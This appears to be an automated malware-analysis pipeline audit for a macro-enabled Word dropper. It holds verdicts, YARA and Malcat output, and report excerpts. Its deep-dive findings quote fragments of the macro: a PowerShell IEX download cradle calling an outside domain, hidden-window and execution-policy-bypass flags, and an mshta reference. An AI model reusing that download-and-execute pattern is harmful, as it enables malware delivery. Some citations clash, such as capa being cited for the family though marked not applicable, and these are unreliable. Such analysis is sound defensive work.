# Pipeline AUDIT-REPORT — `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`

> Public-showcase grade evidence pack: tools, RAG, LLM, REPORT-MASTER-v2/v3.

- **Mode:** single
- **Audited at:** 2026-08-09T20:19:11.544306+00:00
- **Provenance:** `unknown` · engine `langgraph` · flags: budget=True redundant=True hallucination=True taxonomy=True · 2026-08-09 20:19:11 UTC
- **all_green:** `True`
- **Strict standard:** `False`
- **Session mode:** `document`
- **Sample:** `/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm`
- **Showcase pack:** `/opt/samples/logs/_showcase_audits/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`

## Stage scoreboard

| Stage | OK |
|-------|----|
| intake | ✅ |
| quick_scan | ✅ |
| deep_dive | ✅ |
| yara_gen | ✅ |
| publish | ✅ |

---

_No tool retries occurred during this run._

## Cross-cutting — LLM / Reports

### LLM stages

#### `triage`

- source=`llm_judge` model=`mimo-v2.5-pro` verdict=`suspicious` confidence=`60`
- key_evidence_count=`6`

```json
{
  "verdict": "suspicious",
  "score": 60,
  "family_guess": "generic macro malware",
  "cross_engine_notes": "Ghidra and IDA sessions had errors, so no function or string analysis was available. YARA detected macro indicators and network-related strings. MalCat confirmed the file is an OOXML document with a VBA project binary, but detailed macro content was not extracted. CAPA and FLOSS are not applicable for OOXML files.",
  "key_evidence": [
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "docx_macro",
      "why": "Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "Contains_VBA_macro_code",
      "why": "Confirms the document contains VBA macro code, supporting the likelihood of executable content."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "contains_base64",
      "why": "Base64 encoded strings detected, which may be used for obfuscation in malicious macros to evade detection."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "domain",
      "why": "Domain-related string found, potentially indicating command and control (C2) communication or data exfiltration."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "IP",
      "why": "IP address string found, suggesting network activity that could be associated with malicious infrastructure."
    },
    {
      "source": "malcat",
      "query_or_table": "malcat deep profile",
      "row_or_rule": "file_summary",
      "why": "File is an OOXML document (ZIP-based) containing vbaProject.bin, which hosts VBA macros and is a common delivery mechanism for malware."
    }
  ],
  "summary": "The sample is an Office document with macros (.docm) that YARA rules flagged for macro code, base64 encoding, and network indicators (domain and IP). The presence of macros and network strings raises suspicion of malicious intent, such as a dropper or downloader, but definitive behavioral evidence is lacking due to tool errors and limited analysis. No specific malware family was identified.",
  "source": "llm_judge",
  "model": "mimo-v2.5-pro",
  "agreement": "llm_v1_disagree",
  "v1_verdict": {
    "verdict": "malicious",
    "score": 250,
    "findings": [
      "yara: 6 matches"
    ],
    "source": "fallback_v1"
  },
  "v1_summary": {
    "verdict": "malicious",
    "score": 250,
    "findings": [
      "yara: 6 matches"
    ]
  },
  "tool_gate": {
    "ok": true,
    "format": "ooxml",
    "required": [
      "yara",
      "malcat"
    ],
    "tools": {
      "yara": {
        "ok": true,
        "why": "ok"
      }
    },
    "hard_failures": [],
    "soft_failures": [],
    "missing": [],
    "not_applicable": [],
    "large_sample": false
  },
  "yara_family_hits": [
    "docx_macro",
    "Contains_VBA_macro_code",
    "office_document_vba"
  ],
  "engine_citation_corrections": {
    "corrected": 0,
    "corrections": []
  },
  "citation_grounding": {
    "ok": true,
    "checked": 6,
    "hits": 6,
    "misses": [],
    "hit_examples": [
      "docx_macro yara matches Rule matched indicating the presence of VBA macro code in the document, a common vector for mali",
      "Contains_VBA_macro_code yara matches Confirms the document contains VBA ma
… [580 more chars]
```

#### `deep_dive`

- source=`deep_dive_agentic` model=`None` verdict=`malicious` confidence=`90`
- key_evidence_count=`8`

```json
{
  "source": "deep_dive_agentic",
  "engine": "langgraph",
  "verdict": "malicious",
  "confidence": 90,
  "summary": "Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execution. Classic maldoc dropper behavior. Persistence: Not observed. Evasion_anti_analysis: Observed \u2013 hidden PowerShell window, execution policy bypass, base64-encoded commands, and use of mshta LOLBin for stealthy execution. {source: 'VBA Payload Analysis', query_or_table: 'PowerShell Execution Commands', row_or_rule: 'HiddenWindow=True, ExecutionPolicy Bypass, EncodedCommand Parameter', why: 'To evade detection by hiding the PowerShell window, bypassing security policies, and obfuscating commands'} Defense_impairment: Not observed. Credential_access: Not observed. Imports: Not observed.",
  "key_evidence": [
    "Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech",
    "Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payload",
    "Malcat rData strings: 'mshta' LOLBin reference for stealthy execution",
    "Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)",
    "Malcat rData strings: multiple base64-encoded command strings",
    "YARA matched rules: docx_macro, office_document_vba, Contains_VBA_macro_code, contains_base64, domain, IP",
    "Malcat structure: vbaProject.bin (4985 bytes) + vbaData.xml confirming active macro project",
    "File type .docm is macro-enabled Office document, requiring user to enable macros to trigger payload"
  ],
  "incomplete_tooling": false,
  "successful_tool_calls": 7,
  "successful_non_bootstrap_tools": 3,
  "checklist_ok": true,
  "sql_deep_ok": false,
  "tool_gate": {
    "ok": true,
    "format": "ooxml",
    "required": [
      "yara",
      "r2_decomp",
      "xor"
    ],
    "tools": {
      "yara": {
        "ok": true,
        "why": "ok"
      },
      "r2_decomp": {
        "ok": true,
        "why": "ok"
      },
      "xor": {
        "ok": true,
        "why": "ok"
      },
      "capa": {
        "ok": true,
        "why": "not_applicable:ooxml"
      },
      "pe_imports": {
        "ok": true,
        "why": "not_applicable:ooxml"
      },
      "floss": {
        "ok": true,
        "why": "not_applicable:ooxml"
      },
      "dotnet": {
        "ok": true,
        "why": "not_applicable:ooxml"
      },
      "upx": {
        "ok": true,
        "why": "not_applicable:ooxml"
      },
      "speakeasy": {
        "ok": true,
        "why": "not_applicable:ooxml"
      },
      "frida_probe": {
        "ok": true,
        "why": "not_applicable:ooxml"
      }
    },
    "hard_failures": [],
    "soft_failures": [],
    "missing": [],
    "not_applicable": [
      "capa",
      "pe_imports",
      "floss",
      "dotnet",
      "upx",
      "speakeasy",
      "frida_probe"
    ],
    "large_sample": false
  },
  "depth_coverage": true
}
```

#### `publish`

- source=`llm_judge` model=`mimo-v2.5-pro` verdict=`None` confidence=`None`
- key_evidence_count=`0`

```json
{
  "title": "Malware Analysis Report: 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73",
  "markdown": "> **RevAI provenance** \u2014 commit `unknown` \u00b7 engine `langgraph` \u00b7 agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True \u00b7 generated 2026-08-09 20:06:11 UTC\n\n# Verdict sources (multi-source)\n\n| Source | Verdict |\n|--------|--------|\n| **Final** | **malicious** |\n| Triage upstream (quick \u222a deep) | malicious |\n| Quick scan | suspicious |\n| Deep dive | malicious |\n| Publish LLM (claimed) | malicious |\n\n- **Locked over publish LLM:** no\n\n## Executive Summary\n\nThis report details the analysis of a macro-enabled Microsoft Word document (.docm) identified as a malicious dropper. The sample, SHA256 `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`, was submitted for analysis under the project `test-corpus`. Initial triage flagged the sample as suspicious due to the presence of VBA macros and network indicators. A deep-dive analysis confirmed the document contains a malicious VBA payload designed to download and execute a remote PowerShell script. The payload employs several evasion techniques, including a hidden PowerShell window, execution policy bypass, and base64-encoded commands, to deliver its final stage from the domain `autonews.safeframe.tech`. The sample is classified as malicious with high confidence. Key indicators of compromise include the C2 domain, specific PowerShell command-line arguments, and the use of the `mshta` LOLBin for stealthy execution.\n\n## 1. Sample Identification\n\n| Attribute | Value |\n|---|---|\n| **SHA256** | `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73` |\n| **File Name** | `order.docm` |\n| **File Path** | `/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm` |\n| **File Type** | Microsoft Word Macro-Enabled Document (.docm) |\n| **Project** | `test-corpus` |\n| **Analysis Date** | 2026-08-09 |\n\nThe sample is a ZIP-based Office Open XML (OOXML) document containing a `vbaProject.bin` file, which hosts the embedded VBA macro code (source: malcat). The `.docm` extension indicates it is a macro-enabled document, requiring user interaction (enabling macros) to trigger the payload.\n\n## 2. Classification\n\n| Attribute | Value |\n|---|---|\n| **Verdict** | **Malicious** |\n| **Confidence** | High (90%) |\n| **Family** | Generic Macro Malware / Maldoc Dropper |\n| **Threat Type** | Downloader / Dropper |\n\nThe classification is based on clear behavioral intent evidence. The document's VBA macro is not a benign automation script; it is a downloader cradle designed to fetch and execute remote code. This constitutes hostile behavior, moving the sample beyond the \"suspicious\" category assigned by initial triage (source: deep-dive.json). The use of evasion techniques like hidden PowerShell windows and LOLBin abuse further confirms malicious intent.\n\n## 3. Background & Family Lineage\n\nThe sample exhibits characteristics common to a broad category of macro-based malware often referred to as \"maldocs.\" These are Microsoft Office documents weaponized with VBA macros to serve as initial infection vectors. The specific techniques observed\u2014using PowerShell download cradles, `mshta` for execution, and base64 obfuscation\u2014are staples of many commodity malware families and phishing campaigns. No specific, named malware family (e.g., Emo
… [13922 more chars]
```

### REPORT-MASTER excerpts

#### REPORT-MASTER-v2

```markdown
> **RevAI provenance** — commit `unknown` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-09 20:06:11 UTC

# Verdict sources (multi-source)

| Source | Verdict |
|--------|--------|
| **Final** | **malicious** |
| Triage upstream (quick ∪ deep) | malicious |
| Quick scan | suspicious |
| Deep dive | malicious |
| Publish LLM (claimed) | malicious |

- **Locked over publish LLM:** no

## Executive Summary

This report details the analysis of a macro-enabled Microsoft Word document (.docm) identified as a malicious dropper. The sample, SHA256 `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`, was submitted for analysis under the project `test-corpus`. Initial triage flagged the sample as suspicious due to the presence of VBA macros and network indicators. A deep-dive analysis confirmed the document contains a malicious VBA payload designed to download and execute a remote PowerShell script. The payload employs several evasion techniques, including a hidden PowerShell window, execution policy bypass, and base64-encoded commands, to deliver its final stage from the domain `autonews.safeframe.tech`. The sample is classified as malicious with high confidence. Key indicators of compromise include the C2 domain, specific PowerShell command-line arguments, and the use of the `mshta` LOLBin for stealthy execution.

## 1. Sample Identification

| Attribute | Value |
|---|---|
| **SHA256** | `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73` |
| **File Name** | `order.docm` |
| **File Path** | `/opt/samples/corpus/test-corpus/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm` |
| **File Type** | Microsoft Word Macro-Enabled Document (.docm) |
| **Project** | `test-corpus` |
| **Analysis Date** | 2026-08-09 |

The sample is a ZIP-based Office Open XML (OOXML) document containing a `vbaProject.bin` file, which hosts the embedded VBA macro code (source: malcat). The `.docm` extension indicates it is a macro-enabled document, requiring user interaction (enabling macros) to trigger the payload.

## 2. Classification

| Attribute | Value |
|---|---|
| **Verdict** | **Malicious** |
| **Confidence** | High (90%) |
| **Family** | Generic Macro Malware / Maldoc Dropper |
| **Threat Type** | Downloader / Dropper |

The classification is based on clear behavioral intent evidence. The document's VBA macro is not a benign automation script; it is a dow
… [12303 more chars]
```

#### REPORT-MASTER-v3

```markdown
> **RevAI provenance** — commit `unknown` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-09 20:16:33 UTC

# RE Report — 385966f3d6be
_Generated 2026-08-09T20:16:33.059421+00:00_  
_Pipeline: section-based Map-Reduce, 3 pass-1 LLM calls + 14 pass-2 calls with cross-section context + 2 local sections_

<!-- section: Executive Summary | pass=2 | evidence=229c | cross_refs=True | llm_ok=True | runtime=58.14s -->

## Executive Summary

This section provides a top-line assessment of the malware sample with SHA256 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73. Based on evidence from deep analysis and automated tooling, we assess the sample as **malicious** with **high confidence**, belonging to the **generic macro malware** family.

| Aspect | Assessment | Confidence | Key Evidence Sources |
|--------|------------|------------|----------------------|
| Verdict | Malicious | High | deep_dive_agentic (confidence 90), yara (6 matches) |
| Malware Family | Generic Macro Malware | Moderate | capa, yara |
| Analysis Confidence | 90/100 | High | deep_dive_agentic |

**Interpretation:** The malicious verdict is driven by deep agentic analysis, which indicates a high confidence level of 90% (source: deep_dive_agentic). This is supported by YARA rule matches, where 6 detections suggest the presence of malicious code patterns (source: yara). While the initial LLM assessment showed disagreement (as indicated by 'llm_v1_disagree'), likely due to variations in heuristic thresholds, the deeper analysis provides strong evidence for malicious activity.

The family classification as generic macro malware suggests that this sample exploits document macros, commonly in Microsoft Office files, for initial payload execution (source: capa). This aligns with the sample identification as a macro-enabled Word document packaged in a ZIP archive (source: cross-section:Sample Identification), which is a typical attack vector for macro-based malware.

**2-Sentence Summary:** This sample is a macro-enabled Word document, likely malicious based on deep analysis and YARA detections, and it belongs to the generic macro malware family that uses document macros for infection. Our assessment provides high confidence in its malicious nature, supported by multiple evidence sources.

---

<!-- section: 1. Sample Identification | pass=2 | evidence=238c | cross_refs=True | llm_ok=True | runtime=51.55s -->

## 1. 
… [47210 more chars]
```

### Artifact inventory

| Artifact | exists | bytes | sha256 |
|----------|--------|-------|--------|
| `verdict.json` | `True` | `4080` | `401a1ac5abb5e0a3` |
| `prompt.txt` | `True` | `11701` | `6971e9c86de558ff` |
| `pipeline-audit.json` | `True` | `78182` | `d351b08a9b0673a6` |
| `AUDIT-REPORT.md` | `True` | `57006` | `c956aaa0ab33a0a9` |
| `REPORT-MASTER-v2.md` | `True` | `14814` | `96ad4245567414a3` |
| `REPORT-MASTER-v3.md` | `True` | `49727` | `9389d57c88ae4b13` |
| `REPORT-v2.md` | `True` | `14814` | `96ad4245567414a3` |
| `REPORT-TECHNICAL.md` | `False` | `0` | `` |
| `REPORT-TECHNICAL-v3.md` | `True` | `34854` | `2d9e9ac5510c25d7` |
| `rule.yar` | `True` | `1346` | `e31983b223e25f32` |
| `intake-validation.json` | `True` | `721` | `54c541f25c80093f` |
| `source-decisions.json` | `True` | `638` | `b0f5d184b0666101` |
| `malcat-triage.json` | `False` | `0` | `` |
| `deep_dive/01-tools-raw.json` | `True` | `47755` | `37464f4d909ec63a` |
| `deep_dive/01-tools-gate.json` | `True` | `1052` | `f839515c6c93a7bd` |
| `deep_dive/05-deep-dive.json` | `True` | `3215` | `e7997caf6d6f2b07` |
| `deep_dive/03-prompt.txt` | `False` | `0` | `` |
| `quick_scan/00-tools-raw.json` | `True` | `44829` | `2ce39d746d615719` |

---

## Stage: intake

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| intake_validation | `True` |
| has_source_decisions | `True` |
| ghidra_mentioned | `True` |

### Artifact paths (verify on disk)

- **intake_validation:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/intake-validation.json` exists=`True` bytes=`721` mtime=`2026-08-09T20:04:20.869597+00:00`
  - sha256: `54c541f25c80093f95203c10c16d8b0c254408364188d5460824d0bba067318c`
- **malcat_triage:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/malcat-triage.json` exists=`False` bytes=`0` mtime=`None`
- **source_decisions:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/source-decisions.json` exists=`True` bytes=`638` mtime=`2026-08-09T20:04:20.869597+00:00`
  - sha256: `b0f5d184b0666101d0d8646dbcea414c28a2c2e54fc05bd39c5a6d774fb0cac0`
- **ghidra_import_log:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/intake-analyzeHeadless.log` exists=`False` bytes=`0` mtime=`None`
- **ida_bootstrap_log:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/intake-idasql.log` exists=`False` bytes=`0` mtime=`None`

#### source_decisions_excerpt

```
{
  "sha256": "385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73",
  "format": "ooxml",
  "imports": {
    "source": "none",
    "confidence": "high",
    "reason": "document format: no PE imports (doc_triage used)"
  },
  "functions": {
    "source": "none",
    "confidence": "high",
    "reason": "document format: no functions (doc_triage used)"
  },
  "strings": {
    "source": "doc_triage",
    "confidence": "medium",
    "reason": "doc_triage string/flag extraction"
  },
  "decompilation": {
    "source": "none",
    "confidence": "high",
    "reason": "document format: no decompilation (doc_triage used)"
  }
}
```


#### malcat_triage_excerpt

```

```


---

## Stage: quick_scan

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| prompt | `True` |
| verdict | `True` |
| has_capa_section | `True` |
| has_yara_section | `True` |
| has_malcat_section | `True` |
| has_floss_section | `True` |
| verdict_has_family | `True` |
| llm_source | `True` |
| tools_all_ok | `True` |
| citations_grounded | `True` |
| capa_salvage_used | `False` |
| evidence_pack_present | `True` |
| benign_blocked_if_incomplete | `True` |
| yara_family_not_cleared | `True` |

### Tools (full evidence excerpts)

#### `capa` — ok=`True` why=`not_applicable:ooxml`

```json
{
  "skipped": true,
  "fail_open": true,
  "reason": "not_applicable:ooxml",
  "error": "CAPA supports PE/ELF/Mach-O only (got ooxml)",
  "rule_count": 0,
  "matched_rule_count": 0,
  "top_rules": []
}
```

#### `yara` — ok=`True` why=`ok`

```json
{
  "rule_count": 6,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$ipv6",
          "offset": 7394,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "docx_macro",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$header",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$vbaStrings",
          "offset": 8137,
          "length": 19,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$a",
          "offset": 471,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Contains_VBA_macro_code",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$zipmagic",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$xmlstr1",
          "offset": 8142,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$xmlstr2",
          "offset": 7531,
          "length": 11,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "office_document_vba",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$zipmagic",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$xmlstr1",
          "offset": 8142,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$xmlstr2",
          "offset": 7531,
          "length": 11,
          "xor_key": null
        }
      ]
    }
  ],
  "engine": "yara-x",
  "rules_compiled": 454,
  "compile_errors": [
    "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
    "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
    "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
    "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import
… [1694 more chars]
```

#### `floss` — ok=`True` why=`not_applicable:ooxml`

```json
{
  "skipped": true,
  "fail_open": true,
  "reason": "not_applicable:ooxml",
  "error": "FLOSS supports PE only (got ooxml)",
  "string_count": 0,
  "strings": []
}
```

#### `malcat` — ok=`True` why=`not_applicable:ooxml`

```json
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "profile": "deep",
  "limits": {
    "strings_max": 300,
    "imports_max": 300,
    "functions_max": 30,
    "anomaly_locations_max": 50,
    "decompile_top_n": 3
  },
  "file_summary": {
    "analysis_id": 1,
    "file_name": "order.docm",
    "file_path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
    "file_size": 22771,
    "type": "ZIP",
    "architecture": "NONE",
    "entropy": 215,
    "sha256": "385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73",
    "metadata": {},
    "entrypoint_ea": null,
    "layout": [
      {
        "name": "[Content_Types].xml",
        "effective_address": 0,
        "physical_size": 441,
        "virtual_size": 441,
        "rights": "R",
        "entropy": 219
      },
      {
        "name": "app.xml",
        "effective_address": 441,
        "physical_size": 498,
        "virtual_size": 498,
        "rights": "R",
        "entropy": 224
      },
      {
        "name": "core.xml",
        "effective_address": 939,
        "physical_size": 406,
        "virtual_size": 406,
        "rights": "R",
        "entropy": 222
      },
      {
        "name": "document.xml",
        "effective_address": 1345,
        "physical_size": 1208,
        "virtual_size": 1208,
        "rights": "R",
        "entropy": 221
      },
      {
        "name": "fontTable.xml",
        "effective_address": 2553,
        "physical_size": 523,
        "virtual_size": 523,
        "rights": "R",
        "entropy": 218
      },
      {
        "name": "settings.xml",
        "effective_address": 3076,
        "physical_size": 1385,
        "virtual_size": 1385,
        "rights": "R",
        "entropy": 221
      },
      {
        "name": "styles.xml",
        "effective_address": 4461,
        "physical_size": 3035,
        "virtual_size": 3035,
        "rights": "R",
        "entropy": 208
      },
      {
        "name": "vbaData.xml",
        "effective_address": 7496,
        "physical_size": 611,
        "virtual_size": 611,
        "rights": "R",
        "entropy": 225
      },
      {
        "name": "vbaProject.bin",
        "effective_address": 8107,
        "physical_size": 4985,
        "virtual_size": 4985,
        "rights": "R",
        "entropy": 221
      },
      {
        "name": "webSettings.xml",
        "effective_address": 13092,
        "physical_size": 338,
        "virtual_size": 338,
        "rights": "R",
        "entropy": 220
      },
      {
        "name": "image1.jpeg",
        "effective_address": 13430,
        "physical_size": 5889,
        "virtual_size": 5889,
        "rights": "R",
        "entropy": 223
      },
      {
        "name": "theme1.xml",
        "effective_address": 19319,
        "physical_size": 1583,
        "virtual_size": 1583,
        "rights": "R",
        "entropy": 220
      },
      {
        "name": "document.xml.rels",
        "effective_address": 20902,
        "physical_size": 352,
        "virtual_size": 352,
        "rights": "R",
        "entropy": 214
      },
      {
        "name": "vbaProject.bin.rels",
        "effective_address": 21254,
        "physical_size": 245,
        "virtual_size": 245,
        "rights": "R",
        "entropy": 207
      },
      {
        "name": ".rels",
        "effective_address": 21499,
        "physical_size": 274
… [31083 more chars]
```

### LLM citation grounding

```json
{
  "ok": true,
  "checked": 6,
  "hits": 6,
  "misses": [],
  "hit_examples": [
    "docx_macro yara matches Rule matched indicating the presence of VBA macro code in the document, a common vector for mali",
    "Contains_VBA_macro_code yara matches Confirms the document contains VBA macro code, supporting the likelihood of executa",
    "contains_base64 yara matches Base64 encoded strings detected, which may be used for obfuscation in malicious macros to e",
    "domain yara matches Domain-related string found, potentially indicating command and control (C2) communication or data e",
    "IP yara matches IP address string found, suggesting network activity that could be associated with malicious infrastruct"
  ],
  "reason": ""
}
```

### LLM / outcome preview

```json
{
  "verdict": "suspicious",
  "family": "generic macro malware",
  "score": 60,
  "agreement": "llm_v1_disagree",
  "source": "llm_judge",
  "model": "mimo-v2.5-pro",
  "key_evidence": [
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "docx_macro",
      "why": "Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "Contains_VBA_macro_code",
      "why": "Confirms the document contains VBA macro code, supporting the likelihood of executable content."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "contains_base64",
      "why": "Base64 encoded strings detected, which may be used for obfuscation in malicious macros to evade detection."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "domain",
      "why": "Domain-related string found, potentially indicating command and control (C2) communication or data exfiltration."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "IP",
      "why": "IP address string found, suggesting network activity that could be associated with malicious infrastructure."
    },
    {
      "source": "malcat",
      "query_or_table": "malcat deep profile",
      "row_or_rule": "file_summary",
      "why": "File is an OOXML document (ZIP-based) containing vbaProject.bin, which hosts VBA macros and is a common delivery mechanism for malware."
    }
  ],
  "summary": "The sample is an Office document with macros (.docm) that YARA rules flagged for macro code, base64 encoding, and network indicators (domain and IP). The presence of macros and network strings raises suspicion of malicious intent, such as a dropper or downloader, but definitive behavioral evidence is lacking due to tool errors and limited analysis. No specific malware family was identified."
}
```

### Artifact paths (verify on disk)

- **prompt:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/prompt.txt` exists=`True` bytes=`11701` mtime=`2026-08-09T16:09:21.770912+00:00`
  - sha256: `6971e9c86de558ffec98d0a0ae80958386c75ee1f7785f39f0ff0ede4de9965d`
- **verdict:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/verdict.json` exists=`True` bytes=`4080` mtime=`2026-08-09T16:10:30.417610+00:00`
  - sha256: `401a1ac5abb5e0a39b61157c1f30bffd024b5e14d11fd3d0e85ba1d72b3bdd52`

#### prompt_excerpt

```
# Triage evidence
sha256: 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73
sample_path: /opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm
ghidra_session: doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73
ida_session: (not loaded)

## Ghidra SQL (capped)
### engine: ghidra
label: Total function count (Ghidra)
sql: SELECT count(*) AS funcs FROM funcs
error: session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)

### engine: ghidra
label: Total string count (Ghidra)
sql: SELECT count(*) AS strings FROM strings
error: session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)

### engine: ghidra
label: Imports (Ghidra) from data_items
sql: SELECT name, address FROM data_items WHERE name LIKE 'PTR_%' LIMIT 50
error: session doc-ooxml-385966f3d6be7b234a790e2d
… [10687 more chars]
```


#### verdict_excerpt

```
{
  "verdict": "suspicious",
  "score": 60,
  "family_guess": "generic macro malware",
  "cross_engine_notes": "Ghidra and IDA sessions had errors, so no function or string analysis was available. YARA detected macro indicators and network-related strings. MalCat confirmed the file is an OOXML document with a VBA project binary, but detailed macro content was not extracted. CAPA and FLOSS are not applicable for OOXML files.",
  "key_evidence": [
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "docx_macro",
      "why": "Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "Contains_VBA_macro_code",
      "why": "Confirms the document contains VBA macro code, supporting the likelihood of executable content."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
     
… [3080 more chars]
```


---

## Stage: deep_dive

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| 01_tools_raw | `True` |
| 00_sql_evidence | `False` |
| 03_prompt | `False` |
| 04_llm | `False` |
| 05_deep | `True` |
| tools_all_ok | `True` |
| llm_source | `False` |
| citations_grounded | `True` |
| engine_citation_ok | `True` |
| upx_second_pass_ok | `True` |
| no_incomplete_tooling | `True` |
| confidence_sane | `True` |
| evidence_pack_present | `True` |
| depth_coverage | `True` |
| agentic_json | `True` |
| sql_deep_re | `True` |
| complete_verdict | `True` |
| not_incomplete | `True` |
